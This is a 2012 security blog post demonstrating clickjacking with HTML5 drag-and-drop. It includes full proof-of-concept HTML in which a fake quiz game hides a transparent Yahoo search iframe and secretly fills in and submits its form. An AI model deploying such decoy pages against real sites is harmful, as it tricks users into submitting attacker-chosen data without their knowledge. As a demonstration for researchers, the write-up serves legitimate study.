---
layout: post
title:  "Leveraging HTML5 in order to turbocharge clickjacking"
date:   2012-03-28 00:00:00 +0000
categories: blog
image: /assets/images/2012-03-28-HTML5-ClickJacking-1.png

---

You have a website and you've proven it's vulnerable to clickjacking, but what use is fooling a user into submitting a form unless you can specify some of the data that the user is submitting within those fields?.

We've all played games online where you have to match up words to phrases or maybe things like the impossible game where you drag words to the respective colours. What about turning a harmless game such as the above into a form submission machine? Well now with HTML5 - you can!

It's all thanks to the drag-and-drop method and in particular the ondragstart method.

```html
draggable="true" ondragstart="event.dataTransfer.setData('text/plain','Rick Astley')"
```

Use the above on anything you want to make draggable - in my testing I opted for a simple ```<div>``` element containing a string and I ask the players to drag and drop the string onto the correct corresponding sentence.

When they click the answer button it will submit the jacked site.

So users in this case drag the word CSS across to the answer "Cascading Style Sheets" but unknowingly enter "rick astley" into the search field of videos.yahoo.com.

![](/assets/images/2012-03-28-HTML5-ClickJacking-1.png)

When the user then clicks the answer button, this actually submits the search.
![](/assets/images/2012-03-28-HTML5-ClickJacking-2.png)

Resulting in the user getting rick rolled in the background.

![](/assets/images/2012-03-28-HTML5-ClickJacking-3.png)

In case you wanted to play with it yourself the code for it is in the code block below, though bear in mind all of this is hard coded to work on my screen with absolute positioning, you'll need to do more legwork to get it working on your side:

```html
<html>
  <head>
    <title>HTML Clickjacking demonstration - drag and WTF!?</title>
    <style>
      iframe{position: absolute; top:0px; left:0; filter: alpha(opacity=0); opacity:0;z-index:1}
      button{position: absolute; top:40px; left: 805px; z-index:-1; width:107px; height:26px;}
      .magicfield1{position: absolute; top:40px; left: 340px; z-index:-1; height: 26px; border: 1px solid orange}
      .magicfield2{position: absolute; top:40px; left: 480px; z-index:-1; height: 26px; border: 1px solid orange}
      .magicfield3{position: absolute; top:40px; left: 650px; z-index:-1; height: 26px; border: 1px solid orange}
      .magictext{position: absolute; top:54%; left: 50%; z-index:-1; }
      .showhider{position: absolute; top:90%; left: 1%}
      .intro{position: absolute; top:50%; left:0}
    </style>
    <script type="text/javascript">
      function mask(){
        document.getElementById("iframe").style.opacity = ".1"; // for most browsers  
        document.getElementById("iframe").style.filter = "alpha(opacity=10)"; // for IE
      }
      function hide(){
        document.getElementById("iframe").style.opacity = ".0"; // for most browsers  
        document.getElementById("iframe").style.filter = "alpha(opacity=0)"; // for IE
      }
      function show(){
        document.getElementById("iframe").style.opacity = ".9"; // for most browsers;  
        document.getElementById("iframe").style.filter = "alpha(opacity=90)"; // for IE  
      }
      function reveal(){
        alert("Checking your answer...");
        document.getElementById("iframe").style.opacity = ".9"; // for most browsers
        document.getElementById("iframe").style.filter = "alpha(opacity=90)"; //for IE
      }
    </script>
  </head>
  <body>
    <div class="intro">
      <p>Hello and welcome to the match game</p>
      <p>All you have to do is drag the following 3 letter acronym to the matching string ---> </p>
      <p class="showhider">As you know it's a test - <a onClick="show()">Show iframe</a> - <a onClick="hide()">Hide iframe</a> - <a onClick="mask()">Mask iframe</a> </p>
    </div>
    <div class="magictext" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'Rick Astley')">
      <H1 style="border: 1px dashed black">CSS</H1>
    </div>
    <iframe src="http://video.search.yahoo.com/" width="99%" id="iframe" height="50%"></iframe>
    <span class=magicfield1>Cross Site Scripting</span><span class=magicfield2>Cuddly Slippery Snakes</span> <span class="magicfield3">Cascading Style Sheets</span>
    <button>Answer</button>
  </body>
</html>
```

I am no web developer and quickly ran out of patience when working on the positioning issues so feel free to take, improve and build on it. I was just playing with some of the new features of HTML5 to see if they could be useful in my day job.
